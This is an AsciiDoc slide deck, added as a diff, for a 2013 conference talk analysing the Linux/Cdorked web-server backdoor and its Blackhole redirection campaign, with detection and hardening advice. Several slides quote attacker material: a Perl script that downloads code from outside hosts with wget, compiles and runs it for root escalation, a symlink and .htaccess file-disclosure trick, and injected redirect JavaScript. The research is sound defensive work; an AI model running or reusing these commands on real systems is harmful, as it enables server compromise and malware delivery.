@@ -1,0 +1,741 @@
+// Slide-deck
+//
+// To render completely standalone file:
+// $ asciidoc -a data-uri -a linkcss! slides.adoc
+//
+// To link to the assets (images and css) using relative path:
+// $ asciidoc slides.adoc
+Linux/CDorked
+=============
+Olivier Bilodeau, @obilodeau <bilodeau@eset.com>
+v1.0, July 3rd 2013
+:title: Linux/Cdorked
+:description: A server-side malware campaign
+:confname: OWASP Montreal July 2013
+:website: https://www.owasp.org/index.php/Montreal
+:copywrite: CC BY-SA 4.0
+:slidesurl: http://obilodeau.github.io/slides/linux-cdorked/owasp-mtl-201307/
+:backend: dzslides
+:imagesdir: images
+:linkcss: true
+:dzslides-style: owasp-mtl
+:dzslides-transition: horizontal-slide
+:syntaxoff: syntax="no-highlight"
+// :dzslides-highlight: github
+// :dzslides-fonts: family=Yanone+Kaffeesatz:400,700,200,300&family=Cedarville+Cursive
+
+== \\
+=== `:~$ whoami`
+
+[{stepwise}]
+* Linux \{desktop,server\} guy [detail]#10+ years#
+* Been around [detail]#WebStorm Media, Bell Unix/Network, Inverse, ÉTS#
+* Now works for ESET Canada [detail]#Malware Researcher#
+* Achievements [detail]#Defcon, Hackfest, Nsec Hacker Jeopardy, montrehack#
+
+[{topic}]
+== What is this Cdorked thing anyway?
+
+== \\
+
+[quote]
+____
+Linux/Cdorked.A is a backdoor, used by malicious actor to serve malicious content from legitimate websites."
+____
+
+== \\
+
+[quote]
+____
+This malware does not propagate by itself and it does not exploit a vulnerability in a specific software."
+____
+
+
+== \\
+=== How did this started?
+
+[{stepwise}]
+* Sucuri contacted us [detail]#Web incidence response company#
+* Observed malicious behavior [detail]#but couldn't reproduce it#
+
+== \\
+=== Tonight
+
+* technical description [detail]#prevalence, stealthiness, how it works#
+* bigger threat
+* [some] attribution
+* detection, prevention
+* but first...
+
+== \\
+=== Why should you care?
+
+[{stepwise}]
+* Not infecting clients is best for reputation and returning users
+* End-result infection almost always has some sort of credential stealer
+* It is using your resources
+* Your organization uses webservers
+* Ops monitor the servers well? [detail]#this thing is stealthy#
+* Ops don't run AV on Linux servers [detail]#IMHO nor should they#
+
+[NOTES]
+====
+* this thing is stealthy
+* biz also: not good if you infect your own organization
+* They've got an httpd privileged shell!!
+** but how did they installed it? A: root
+====
+
+== \\
+=== High-level description
+ 
+[{stepwise}]
+* backdoor compiled in popular Web Servers 
+** Apache, nginx, lighttpd
+* redirect end-users HTTP requests [detail]#based on certain parameters#
+
+[NOTES]
+====
+You have to be motivated to support all these webservers
+
+====
+
+== \\
+=== Prevalence
+
+[{stepwise}]
+* Hundreds (thousands?) of compromised servers
+* 50 ranked in Alexa's top 100 000
+* Active since December 2012
+* 100 000 ESET users exposed [detail]#but protected!#
+* 3rd party info reveals several 100k's
+
+[{topic}]
+== Lets get `technical`
+
+== \\
+=== Stealth
+
+[{stepwise}]
+* only modified daemon binary on disk [detail]#no logs, no config#
+* no hardcoded C&C servers [detail]#push instead of pull#
+* configuration pushed by attacker through obfuscated HTTP requests
+* uses POSIX shared memory for IPC
+* strings are encrypted with a static XOR key image:xorkey.png[]
+
+[NOTES]
+====
+* no logs is actually possible *because* it is not a module and can affect
+  the logging chain
+* harcoded C2: as opposed to most other threat we encounter. 
+  possible because nature of webserver.
+* obfusc HTTP: and these skip the webserver's usual logging mechanisms
+====
+
+== \\
+=== Stealth++
+
+Found in the wild doing:
+
+[{stepwise}]
+* Strict User-Agent blocking
+* Strict Accept-Language blocking
+* Long list of blacklisted IPs [detail]#~50% of IPv4#
+
+[NOTES]
+====
+* Languages: no JP, finnish, russian, ukrainian, kazakh or belarusian
+====
+
+== \\
+=== Shared memory
+
+[{stepwise}]
+* 6 MiB of POSIX shared memory [detail]#`shm`#
+* Used for inter-process communications (IPC)
+* First variant had world-writable permissions [detail]#doh..# 
+  image:shm.png[]
+
+== \\
+=== Command channels
+
+Two main command channels
+
+* Reverse-connect backdoor
+* HTTP Location redirect control
+
+[{topic}]
+== Backdoor
+
+== \\
+
+// ref: http://www.welivesecurity.com/wp-content/uploads/2013/04/backdoor1-623x412.jpg
+image::backdoor.jpg[height="100%"]
+
+[NOTES]
+====
+* This is ESET researcher's view of a backdoor
+====
+
+== \\
+=== Backdoor component
+
+[{stepwise}]
+* Some code "borrowed" from `cd00r` + 
+  [detail]#a popular linux reverse-shell#
+* Triggered via special `HTTP GET URI` and parameters
+* Connect back is XOR obfuscated
+
+[NOTES]
+====
+* hence the name
+====
+
+== \\
+=== XOR obfuscation
+
+[source,python]
+----
+h = headers
+ip = (h['X-Real-IP'] || h['X-Forwarded-For'] || h['Remote-addr'])
+ip = socket.inet_aton(ip)
+xorkey = array.array('c', (
+    (ord(ip[0]) + w) % 256,
+    (ord(ip[1]) + x) % 256,
+    (ord(ip[2]) + y) % 256,
+    (ord(ip[3]) + z) % 256))
+command = xor_decrypt(query_string, xorkey)
+----
+
+Since we can control `X-Real-IP` or + 
+`X-Forwarded-For` a `0x00000000` key can be constructed
+
+== \\
+=== Backdoor quirks 
+
+[{stepwise}]
+* HTTP request hung until the shell is exited
+* Upon termination, HTTP 302 redirects to google.com
+* This is logged unlike other actions!
+
+[{topic}]
+== Malicious payload
+
+HTTP Location redirect
+
+== \\
+=== Controlling it
+
+[cols="1,4", width="95%", align="center", options="header"]
+|============================================================================
+|Command    | Description
+|'L1', 'D1' | Load or delete the list of *redirect URL*
+|'L2', 'D2' | Load or delete the list of *blacklisted IP* ranges  
+|'L3', 'D3' | Load or delete the list of *User-Agent whitelist* pattern 
+|'L4', 'D4' | Load or delete the list of *User-Agent blacklist* pattern 
+|'L5', 'D5' | Load or delete the list of *Referer whitelist* pattern
+|'L6', 'D6' | Load or delete the list of *blacklisted IP* 
+|'L7', 'D7' | Load or delete the list of request *excluded pages*
+|'L8', 'D8' | Load or delete the list of *whitelisted IP* ranges
+|'L9', 'D9' | Load or delete the list of *Accept-Language blacklisted* patterns 
+|'LA', 'DA' | Load or delete the list of request *whitelisted pages*
+|'ST'       | Print server stats 
+|'DU'       | Clear the list of redirected IPs 
+|'T1'       | A timestamp
+|============================================================================
+
+[NOTES]
+====
+*23 commands* available to affect redirection conditions
+
+====
+
+== \\
+=== Staying under the radar
+
+[{stepwise}]
+* Won't redirect if URL, `Server-Name` or `Referrer` matches any of: + 
+  'adm', 'webmaster', 'submit', 'stat', 'mrtg', 'webmin', 'cpanel', 'memb',
+  'bucks', 'bill', 'host', 'secur', 'support'
+* Additional restrictions on `Accept-Language`, `Accept-Encoding` and 
+  `Referrer` headers
+
+== \\
+=== Not too aggressive
+
+Only redirects victims once
+
+* Relies on some hardcoded cookie
++
+[source,perl]
+----
+$cookie =~ /GIDID=6745609876567/;
+----
++
+* and, we're pretty sure, also with server-side state
+
+== \\
+=== Lastly
+
+* Custom redirections supported [detail]#`User-Agent` based#
+
+== \\
+=== Redirection control mechanism
+
+The query must have:
+
+[{stepwise}]
+* `POST` to a special URL pattern (not unique)
+* Client IP is similarily XORed as with the backdoor mechanism
+* `SECID=...` cookie to pass arguments to the malware
+* Some status returned through ETag header
+
+[NOTES]
+====
+* Varies per sample
+* With hex-encoded command in the query portion
+====
+
+[{topic}]
+== Beyond Cdorked
+
+Let's see how the campaign we are tracking right now behaves.
+[detail]#You have an idea for a cool name?#
+
+But first...
+
+[NOTES]
+====
+* Cdorked is the framework, we will look at this campaign's implementation
+====
+
+== \\
+
+// ref: http://geekmom.com/wp-content/uploads/2013/04/153309main_hidden_blackhole_lg.jpg
+image::blackhole.jpg[width="100%"]
+
+[NOTES]
+====
+* but first you need to understand blackhole
+====
+
+== \\
+=== Blackhole background
+
+[{stepwise}]
+* Operator 'licenses' a copy of Blackhole
+* Victim loads compromised Web page who sends it to Blackhole server
+* Server push obfuscated javascript to identify usable vulnerability
+* Server sends exploit [detail]#Browser, Java applet, Adobe Reader or Flash, etc.#
+* Operator decides what malicious code he 'deploys' on client computer
+
+[NOTES]
+====
+* We believe the real server is usually hidden behind reverse-proxy on
+  compromised site
+====
+
+== \\
+=== Redirection chain
+
+----
+Location: hxxp://dcb84fc82e1f7b01.xxxxxxgsm.be/index.php?j=anM9MSZudmNiaW11Zj1jY3Zja3FqdSZ0aW1lPTEzMDQxNjE4MjctMzYwNDUzNjUwJnNyYz0yMzImc3VybD13d3cuaW5mZWN0ZWRzZXJ2ZXIuY29tJnNwb3J0PTgwJmtleT0xM0Q5MDk1MCZzdXJpPS9mb3J1bS93Y2YvanMvM3JkUGFydHkvcHJvdG9hY3Vsb3VzLjEuOC4yLm1pbi5qcw==
+----
+
+* OWASP people, what is this?
+
+== \\
+=== Yes, Base64!
+
+* `j=` is base64 encoded:
+----
+js=1&nvcbimuf=ccvckqju&time=1304161827-360453650&src=232&surl=www.infectedserver.com&sport=80&key=13D90950&suri=/forum/wcf/js/3rdParty/protoaculous.1.8.2.min.js
+----
+* `surl`, `sport`, `suri`, `js`, ...
+* Data to client delivered based on URL (javascript, html)
+
+== \\
+=== Example first javascript redirection
+
+[source,javascript]
+----
+var iflag = "0"; if (top!=self) { iflag = "1"; };
+var b64str = "MTQxNDExMzA1MDIyMjQ4M...luLmNvbS9zb3J0LnBocA==";
+setTimeout ( function() { 
+    location.replace( "hxxp://ae334b05c4249f38" + iflag + b64dec(b64str) );
+}, 280);
+----
+* `iflag`: prevent/detect a straight query?
+* `b64` provided by server. debase64'd gives something like:
++
+----
+1414113050222483098587bcf02fc1731aade45f74550b.somedomain.com/sort.php
+----
+// Copyright ESET Canada used with permission
+image:generated-domain.png[]
+
+[NOTES]
+====
+Why extended DNS? Not sure but:
+* keep client side state (timestamp)
+* operator think it's stealthy?
+====
+
+== \\
+=== Example iframe injection
+
+[source, javascript]
+----
+function gotime() { xflag=false; top.location.replace(b64dec("aHR0cDovL2FlMzM0YjA1YzQyNDlmM...
+...cD94PTEzNyZ0PXRpbWVvdXQ=")); };
+var timer=setTimeout("gotime()", 21000);
+var ewq;
+ewq=document.createElement("span");
+ewq.innerHTML=b64dec("PGlmcmFtZSBzcmM9Im...1lPjxicj4=");
+setTimeout(function() { document.body.insertBefore(ewq,document.body.lastChild); }, 504);
+aHr...XQ= : hxxp://ae334b05c4249f38014141130...
+...50222483098587bcf02fc1731aade45f74550b.somedomain.com/exit.php?x=137&t=timeout
+< .. content .. >
+----
+
+Leading you to a blackhole exploit kit
+
+== \\
+=== Other devices?
+
+Saw iPhone, iPad explicitly redirected to porn
+
+[NOTES]
+====
+* monetization?
+====
+
+[{topic}]
+== Let's recap
+
+You go to your favorite site
+
+== \\
+
+// ref: screen of http://catoverflow.com
+image::catoverflow.png[width="100%"]
+
+[{topic}]
+== Demo
+
+[NOTES]
+====
+* draw on the whiteboard something like this: infection-sequence.svg
+====
+
+== \\
+=== While researching this
+
+* Evidence of link to SSHDoor [detail]#aka Ebury#
+* IPs cross-referenced between the two
+* DNS algo changed since we published + 
+  [detail]#they are watching us watch them#
+
+== \\
+
+Compare XORs
+
+[options="header"]
+|=====================================================
+| CDorked XOR             | SSHDoor XOR
+| image:cdorked-xor.png[] | image:sshdoor-xor.png[]
+|=====================================================
+
+
+== \\
+=== Quite complex server-side operation
+
+[{stepwise}]
+* Compromised web-servers
+* Compromised SSH servers [detail]#stealing credentials, private keys, ...#
+* Compromised DNS servers
+
+== \\
+=== Tracking
+
+* Seen a single server redirect 28 000 users to malware in 24h
+* Around 10 nameservers tracked
+* Cleaned hosts get reinfected [detail]#:(#
+
+== \\
+=== Tracking changes
+
+* Domain name changes quickly
+* Nameservers changes less quickly
+* Blackhole host (reverse-proxies?) changes even less often
+* Query path also changes + 
+  [detail]#`/info/last/index.php` is now `/sec/i/index.php`#
+
+== \\
+=== Some numbers
+
+image:info-last-hits.png[width="95%"]
+
+== \\
+=== Ongoing investigation
+
+* We have a compromised DNS server sample
+* SSH backdoors more prevalent than we initially thought [detail]#several versions#
+
+Expect blog posts with more information soon!
+
+== \\
+=== How did we get there?
+
+[{stepwise}]
+* Got sample
+* Mad reversing skillz
+* Bulk imported the Apache headers in IDA
+* Confirmed hypothesis in virtual environment
+* Using our data sources for further analysis
+
+[NOTES]
+====
+* Please please send us your samples! We analyze them for free (if they are interesting)
+* added functions were actually pretty easy to spot (hash-looking names)
+====
+
+[{topic}]
+== What can you do?
+
+== \\
+=== Detect it
+
+* We have made an open source small
+  http://www.welivesecurity.com/wp-content/uploads/2013/04/dump_cdorked_config.c[detection program]
+* Backdoor usage could be detected via netstat
+
+[NOTES]
+====
+* latest Cdorked version not detected by it... shm perm and size changes.
+  working on it
+* due to long lived outgoing TCP connection from Apache process
+====
+
+[{topic}]
+== Prevent it
+
+== \\
+=== Verify your OS' integrity
+
+* http://manpages.ubuntu.com/manpages/natty/man1/debsums.1.html[debsums]
+* http://linux.die.net/man/8/rpm[rpm --verify]
+* External integrity verification [detail]#tripwire, memory forensics#
+
+But remember that the integrity database can be tampered with!
+
+[NOTES]
+====
+* lesser known could be better
+* arguably you want to verify maybe from remote location
+====
+
+== \\
+=== Build farms of Linux malware?
+
+I don't think so!
+
+So don't install `gcc` on production systems!
+
+[NOTES]
+====
+* but actually maybe they do spread with RPMs since they are root?
+* lets discuss this over beer :)
+====
+
+== \\
+=== Other ideas
+
+* Reduce attack surface with read-only filesystem for your webroot/
+* Disable the `shell` of your webserver user
+
+[NOTES]
+====
+* lets discuss this over beer :)
+====
+
+== \\
+
+[quote]
+____
+But why are these servers getting popped in the first place?"
+____
+
+== \\
+=== We don't know...
+
+Hypothesis
+
+[{stepwise}]
+* leaked credentials
+* compromised *panel software
+* webapp vulnerabilities
+
+[NOTES]
+====
+* our industry isn't as equipped to do server forensics
+* discuss the leaks
+====
+
+== \\
+=== Escalation to root
+
+Symlink attacks combined with
+
+[{stepwise}]
+* cron jobs
+* custom `php.ini`
+* procmail, cgi-bin/
+
+[NOTES]
+====
+* from FTP or httpd account
+* sucuri's info
+====
+
+== \\
+=== .htaccess
+
+I want to read anything!
+
+----
+$ ln -s / /home/userX/www/root
+$ cat /home/userX/www/.htaccess
+Options all
+DirectoryIndex Sux.html
+AddType textplain .php
+AddType textplain .conf
+AddType textplain .sql
+AddType textplain .log
+AddHandler server-parsed .php
+AddHandler txt .html
+Require None
+Satisfy Any
+----
+
+== \\
+=== Privileged operations
+
+* Environment injection in `setuid` scripts
+* Badly written cronjobs
+* ...
+
+== \\
+=== Serialized exploitation
+
+[source,perl]
+----
+#! /usr/bin/perl
+# Exploit tools v2.0 coded by iskorpitx (Turkish Hacker)
+# linux serverlerde gecerlidir
+# by iskorpitx
+{
+system("rm *.txt”);
+system("wget http://www.euromedalex.org/profiles/a.c”);
+system("gcc a.c -o ab”);
+system("chmod 777 ab”);
+system("./ab”);
+system("./id”);
+system("wget http://www.euromedalex.org/profiles/a”);
+system("chmod 777 a”);
+system("./a”);
+system("id”);
+system("rm ab.txt”);
+system("wget www.cuia.net/media/ab.txt”);
+system("wget www.kassfm.co.ke/cache/15704.c”);
+system("gcc 15704.c -o 1704″);
+system("chmod 777 1704″);
+system("./1704″);
+system("id”);
+...
+----
+
+[NOTES]
+=====
+* Sucuri found scripts like these on servers
+* clearly not APT-style attackers ;)
+=====
+
+== \\
+=== Nothing new
+
+It's the sheer volume of badly hosted sites that makes CDorked and this
+campaign what it is.
+
+[NOTES]
+====
+* Not much new regarding how to secure your stuff
+====
+
+== \\
+=== Community reaction to Cdorked
+
+Tools
+
+* https://blog.kumina.nl/2013/05/checking-for-linuxcdorked-a/[Nagios/Icinga check tool released by Kumina]
+* http://pastebin.com/EittPYmK[Perl reimplementation of original check tool]
+
+[NOTES]
+====
+* The biggest article on our blog.
+Coverage in
+* Ars Technica
+* Slashdot
+====
+
+== \\
+=== Special thanks
+
+* Sucuri Team
+* Marc-Etienne M. Léveillé [detail]#ESET Researcher#
+* Sébastien Duquette [detail]#ESET Researcher#
+* François Chagnon [detail]#ESET Researcher#
+* Pierre-Marc Bureau [detail]#ESET Researcher#
+
+== \\
+=== Conclusion
+
+* Be careful
+* Spread the word
+* Send us binaries!
+
+== \\
+=== Questions?
+
+Thank you!
+
+[{topic}]
+== References
+
+== \\
+=== Our own research
+
+* http://www.welivesecurity.com/2013/04/26/linuxcdorked-new-apache-backdoor-in-the-wild-serves-blackhole/[Linux/Cdorked.A: New Apache backdoor being used in the wild to serve Blackhole]
+* http://www.welivesecurity.com/2013/05/07/linuxcdorked-malware-lighttpd-and-nginx-web-servers-also-affected/[Linux/Cdorked.A malware: Lighttpd and nginx web servers also affected]
+* and some more yet-to-be-published information
+
+== \\
+=== Sucuri's
+
+* http://blog.sucuri.net/2013/06/new-apache-module-injection.html[New Apache Module Injection]
+* http://blog.sucuri.net/2013/05/from-a-site-compromise-to-full-root-access-symlinks-to-root-part-i.html[From a Site Compromise to Full Root Access – Symlinks to Root – Part I]
+* http://blog.sucuri.net/2013/05/from-a-site-compromise-to-full-root-access-local-root-exploits-part-ii.html[From a Site Compromise to Full Root Access – Local Root Exploits – Part II]
+
+== \\
+
+Others
+
+* https://code.google.com/p/malware-lu/wiki/en_malware_cdorked_A[Malware.lu: Analyse of the sample cdorked.A]
+* http://blog.spiderlabs.com/2013/06/digging-into-the-new-apache-injection-module.html[Spiderlabs: Digging into the New Apache Injection Module]
+* http://en.wikipedia.org/wiki/Blackhole_exploit_kit[Wikipedia: Blackhole exploit kit]
+* http://secondlookforensics.com/linux-malware-detection/[Secondlook Forensics: Linux Malware Detection]
+
+3rd party tools
+
+* https://blog.kumina.nl/2013/05/checking-for-linuxcdorked-a/[Detection through Nagios / Icinga]
+* http://pastebin.com/EittPYmK[Perl reimplementation of original python checker]
